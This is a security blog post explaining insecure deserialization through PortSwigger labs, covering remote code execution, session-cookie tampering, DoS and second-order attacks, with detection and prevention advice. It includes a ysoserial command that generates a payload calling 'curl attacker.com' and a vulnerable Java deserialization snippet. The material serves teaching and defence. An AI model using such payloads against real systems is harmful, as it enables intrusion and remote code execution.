---
title: "Understanding Insecure Deserialization - OWASP Top 10 & PortSwigger Labs"
date: 2025-07-31
layout: post
tags: [owasp, insecure-deserialization, web-security, portswigger]
---

<div style="background-color: #f9f9f9; padding: 20px; border-left: 5px solid #007acc; border-radius: 6px; margin-bottom: 20px;">

<strong> Table of Contents</strong>

<ul>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#why-insecure-deserialization-is-dangerous">Why Insecure Deserialization Is Dangerous</a></li>
  <li><a href="#how-insecure-deserialization-works">How Insecure Deserialization Works</a></li>
  <li><a href="#1-remote-code-execution">1. Remote Code Execution</a></li>
  <li><a href="#2-authentication-bypass">2. Authentication Bypass</a></li>
  <li><a href="#3-privilege-escalation--dos">3. Privilege Escalation & DoS</a></li>
  <li><a href="#4-second-order-deserialization">4. Second-Order Deserialization</a></li>
  <li><a href="#summary">Summary</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#references">References</a></li>
</ul>

</div>

## Introduction

**Insecure Deserialization** happens when an application deserializes untrusted data without proper validation. Attackers exploit this to manipulate application logic, escalate privileges, or even achieve **Remote Code Execution (RCE)**. This vulnerability is part of the OWASP Top 10 and often leads to complete system compromise.

All practical examples in this blog are based on **PortSwigger Labs** and my experiments, which are available on [my GitHub repository](https://github.com/haidang17-IA/owasp-top10-labs).

---

## Why Insecure Deserialization Is Dangerous

When untrusted serialized data is accepted by an application and deserialized without checks, attackers can:

- Inject **malicious objects** into the app’s memory
- Execute **arbitrary system commands**
- **Bypass authentication**, elevate access
- Cause **denial-of-service (DoS)** or **data corruption**

Unlike SQLi or XSS, this attack targets the app's **internal object structures**, making it harder to detect and prevent.

---

## How Insecure Deserialization Works

Let’s consider this simplified logic:

```java
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
User user = (User) in.readObject();  // ⚠️ Dangerous!
```

If an attacker modifies the serialized `User` object and sends a manipulated one, the application will **blindly execute** whatever logic is embedded in it — even dangerous constructors or overridden methods like `readObject()`.

---

## 1. Remote Code Execution

### How it works:  
In certain libraries (e.g., **Apache Commons Collections**, **Spring**), classes can trigger system-level methods during deserialization.

Attackers use tools like `ysoserial` to generate a serialized payload that, once deserialized, executes a command (e.g., reverse shell or `curl`).

```bash
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com" > payload.ser
```

This payload is then sent to a vulnerable endpoint that performs deserialization.

### Detection:
- Look for `ObjectInputStream`, `readObject()` or similar in code
- Analyze suspicious logs or stack traces
- Monitor network traffic for callbacks to attacker servers

### Prevention:
- Never deserialize untrusted input
- Use allowlists of deserializable classes
- Use safer formats like JSON with strict schema
- Validate digital signatures or HMACs for integrity

<div style="text-align: center;">
  <img src="/top10-owasp-blog/assets/images/insecure-deserialization.png" alt="Deserialization Attack Flow" style="width: 50%; border: 1px solid #ccc; border-radius: 8px;">
  <p><em>Figure: Exploiting deserialization to trigger RCE</em></p>
</div>

---

## 2. Authentication Bypass

### How it works:  
Some applications serialize entire **user session** or **authentication state** into cookies or hidden fields. If this data isn’t encrypted or signed, attackers can tamper with it.

#### Example:
```text
Cookie: session=base64(serialized_user_object)
```

Attacker decodes, modifies `role=admin`, re-encodes and gains elevated access.

### Detection:
- Look for serialized blobs in cookies or URL params
- Inspect base64-encoded or binary values for structure

### Prevention:
- Sign session tokens with HMAC
- Store session state server-side
- Avoid putting serialized objects in user-controllable places

---

## 3. Privilege Escalation & DoS

### How it works:  
Manipulated serialized input can change logic flows, impersonate users, or consume resources:

- Inflate object graph size → crash app (billion laughs attack style)
- Change internal flags like `isAdmin=true`
- Create fake user tokens

### Detection:
- Monitor for unusually large or nested serialized inputs
- Analyze memory usage and CPU spikes on deserialization

### Prevention:
- Limit size and depth of accepted serialized objects
- Set deserialization timeout
- Enforce input format validation

---

## 4. Second-Order Deserialization

### How it works:  
Attacker injects a **malicious object** into the database or file system. The object sits dormant until the app deserializes it later in a different context.

#### Example:
- Injected via profile update or comment field
- Later deserialized when admin views it

This attack is sneaky because the deserialization point and injection point are **not in the same place**.

### Detection:
- Review all deserialization points
- Log all data sources leading to object deserialization

### Prevention:
- Sanitize and validate any data that might later be deserialized
- Isolate data flows that involve stored serialized objects
- Perform regular code audits

---


## Conclusion

Insecure deserialization is a silent yet devastating vulnerability. If left unchecked, it can lead to **RCE, access control failures, and data corruption**. Through practicing with **PortSwigger Labs**, I learned how such attacks are constructed and how easily insecure logic can be exploited.

As a developer or security analyst:
- Never trust client-controlled data
- Use structured data formats
- Audit and test deserialization paths regularly

Explore my lab notes and payloads in [this GitHub repo](https://github.com/haidang17-IA/owasp-top10-labs).

---

## References

- [OWASP Deserialization Guide](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization)
- [PortSwigger Insecure Deserialization Labs](https://portswigger.net/web-security/deserialization)
